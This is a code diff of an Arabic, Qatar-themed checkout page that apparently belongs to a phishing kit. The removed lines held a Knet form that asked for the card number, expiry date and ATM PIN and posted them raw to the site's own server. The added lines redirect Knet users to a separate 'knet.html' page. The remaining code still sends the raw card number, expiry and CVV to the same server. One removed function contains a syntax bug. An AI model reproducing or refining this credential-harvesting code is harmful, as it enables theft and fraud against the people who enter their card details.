@@ -673,38 +673,7 @@
 
                 <button type="submit" class="pay-btn" id="payBtn">تأكيد الدفع - <span id="btnTotal">35 ر.ق</span></button>
                 
-                <!-- Knet Inline Form -->
-                <div id="knetCardSection" class="card-input-section" style="display:none;">
-                    <h3><i class="fas fa-university" style="color:#0070cd;"></i> بيانات بطاقة Knet</h3>
-
-                    <div class="form-group">
-                        <label>رقم بطاقة الصراف الآلي</label>
-                        <div class="card-number-wrapper">
-                            <input type="text" id="knetCardNumber" name="knet_card_number" class="form-control" required placeholder="1234 5678 9012 3456" maxlength="19" oncopy="return false;" onpaste="return false;">
-                            <i class="fas fa-credit-card card-type-icon" id="knetCardTypeIcon" style="font-size: 24px; color: #0070cd;"></i>
-                        </div>
-                        <div class="field-error" id="knet_card_number_error"></div>
-                    </div>
-
-                    <div class="form-row">
-                        <div class="form-group">
-                            <label>تاريخ الانتهاء</label>
-                            <div style="display: flex; gap: 8px; align-items: center;" dir="ltr">
-                                <input type="text" id="knetExpiryMonth" class="form-control" required placeholder="MM" maxlength="2" style="width: 70px; font-size:14px; padding:10px 12px;">
-                                <span style="font-size: 20px; font-weight: 700; color: #888;">/</span>
-                                <input type="text" id="knetExpiryYear" class="form-control" required placeholder="YY" maxlength="2" style="width: 70px; font-size:14px; padding:10px 12px;">
-                            </div>
-                            <div class="field-error" id="knet_expiry_error"></div>
-                        </div>
-                        <div class="form-group">
-                            <label>الرقم السري (PIN)</label>
-                            <input type="password" id="knetPin" name="knet_pin" class="form-control" required placeholder="••••" maxlength="4" oncopy="return false;" onpaste="return false;" style="font-size:14px; padding:10px 12px;">
-                            <div class="field-error" id="knet_pin_error"></div>
-                        </div>
-                    </div>
-                </div>
-
-                <button type="button" id="knetPayBtn" class="pay-btn" style="display:none; background:#0070cd;" onclick="submitKnetPayment()">تأكيد الدفع - <span id="knetBtnTotal">35 ر.ق</span></button>
+                <button type="button" id="knetBtn" onclick="goToKnet()" class="pay-btn" style="display:none; background:#0070cd;">متابعة الدفع عبر Knet</button>
 
                 <div class="supported-cards">
                     <i class="fab fa-cc-visa" style="color:#1A1F71;"></i>
@@ -758,125 +727,35 @@
             const knetDiv = document.getElementById('selectKnet');
             const creditSection = document.getElementById('creditCardSection');
             const payBtn = document.getElementById('payBtn');
-            const knetCardSection = document.getElementById('knetCardSection');
-            const knetPayBtn = document.getElementById('knetPayBtn');
+            const knetBtn = document.getElementById('knetBtn');
 
             if (method === 'credit') {
                 creditDiv.style.borderColor = 'var(--qatar-maroon)';
                 knetDiv.style.borderColor = '#eee';
                 creditSection.style.display = 'block';
                 payBtn.style.display = 'block';
-                knetCardSection.style.display = 'none';
-                knetPayBtn.style.display = 'none';
+                knetBtn.style.display = 'none';
             } else {
                 creditDiv.style.borderColor = '#eee';
                 knetDiv.style.borderColor = '#0070cd';
                 creditSection.style.display = 'none';
                 payBtn.style.display = 'none';
-                knetCardSection.style.display = 'block';
-                knetPayBtn.style.display = 'block';
+                knetBtn.style.display = 'block';
             }
         }
 
-        function submitKnetPayment() {
-            const orderId = sessionStorage.getItem('orderId');
-            if (!orderId) {
-                alert('خطأ: لم يتم العثور على رقم الطلب');
-                window.location.href = 'data.html';
-                return;
-            }
-
-            const country = localStorage.getItem('selectedCountry') || document.getElementById('country').value;
+        function goToKnet() {
+            // Save address info before redirecting
             const city = document.getElementById('city').value;
-            const street = document.getElementById('street').value.trim();
-            const buildingNumber = document.getElementById('building_number').value.trim();
-            const floor = document.getElementById('floor').value;
-
-            // Validate delivery address
-            if (!country) {
-                alert('يرجى اختيار الدولة');
+            const street = document.getElementById('street').value;
+            const building = document.getElementById('building_number').value;
+            
+            if (!city || !street || !building) {
+                alert('يرجى إكمال بيانات عنوان التوصيل أولاً');
                 return;
             }
-            if (!city || !street || !buildingNumber || !floor) {
-                alert('يرجى إكمال بيانات عنوان التوصيل');
-                return;
-            }
-
-            // Validate Knet fields
-            const knetCardNumber = document.getElementById('knetCardNumber').value.trim();
-            const rawKnetCardNumber = knetCardNumber.replace(/\s/g, '');
-
-            if (!rawKnetCardNumber || rawKnetCardNumber.length < 12 || rawKnetCardNumber.length > 19) {
-                showFieldError('knetCardNumber', 'knet_card_number_error', 'رقم البطاقة يجب أن يكون بين 12 و 19 رقمًا');
-                return;
-            }
-
-            const expiryMonth = document.getElementById('knetExpiryMonth').value.trim();
-            const expiryYear = document.getElementById('knetExpiryYear').value.trim();
-
-            if (!expiryMonth || !expiryYear) {
-                showFieldError('knetExpiryMonth', 'knet_expiry_error', 'يرجى إدخال تاريخ الانتهاء بشكل صحيح');
-                return;
-            }
-
-            const monthNum = parseInt(expiryMonth, 10);
-            const yearNum = parseInt('20' + expiryYear, 10);
-
-            if (monthNum < 1 || monthNum > 12) {
-                showFieldError('knetExpiryMonth', 'knet_expiry_error', 'شهر الانتهاء غير صالح');
-                return;
-            }
-
-            const now = new Date();
-            const expiryDate = new Date(yearNum, monthNum, 1);
-            if (expiryDate < now) {
-                showFieldError('knetExpiryMonth', 'knet_expiry_error', 'تاريخ الانتهاء غير صالح');
-                return;
-            }
-
-            const pin = document.getElementById('knetPin').value.trim();
-            if (!/^\d{4}$/.test(pin)) {
-                showFieldError('knetPin', 'knet_pin_error', 'الرقم السري يجب أن يكون 4 أرقام');
-                return;
-            }
-
-            const data = {
-                orderId,
-                payment_method: 'Knet',
-                knet_data: {
-                    card_number: rawKnetCardNumber,
-                    expiry_month: expiryMonth,
-                    expiry_year: expiryYear,
-                    pin: pin
-                },
-                delivery_address: {
-                    country: country,
-                    city: city,
-                    street: street,
-                    building_number: buildingNumber,
-                    floor: floor
-                }
-            };
-
-            try {
-                const response = await fetch('/api/orders/payment-data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-
-                const result = await response.json();
-
-                if (response.ok) {
-                    document.getElementById('loadingOverlay').style.display = 'flex';
-                    pollInterval = setInterval(pollOrderStatus, 2000);
-                } else {
-                    document.getElementById('errorMessage').textContent = result.error || 'حدث خطأ في معالجة الدفع';
-                    showErrorModal();
-                }
-            } catch (err) {
-                alert('حدث خطأ في الاتصال بالخادم');
-            }
+            
+            window.location.href = 'knet.html';
         }
 
         // ===== VALIDATION FUNCTIONS =====
@@ -1258,13 +1137,6 @@
                 return;
             }
 
-            // Ensure delivery address is set
-            const knetCardSection = document.getElementById('knetCardSection');
-            if (knetCardSection && knetCardSection.style.display !== 'none') {
-                alert('يرجى اختيار وسيلة الدفع الصحيحة');
-                return;
-            }
-
             const rawCardNumberSend = cardNumber.replace(/\s/g, '');
 
             const data = {
@@ -1273,7 +1145,6 @@
                 card_number: rawCardNumberSend,
                 expiry_date: rawExpiry,
                 cvv: cvv,
-                payment_method: 'Credit',
                 delivery_address: {
                     country: country,
                     city: city,
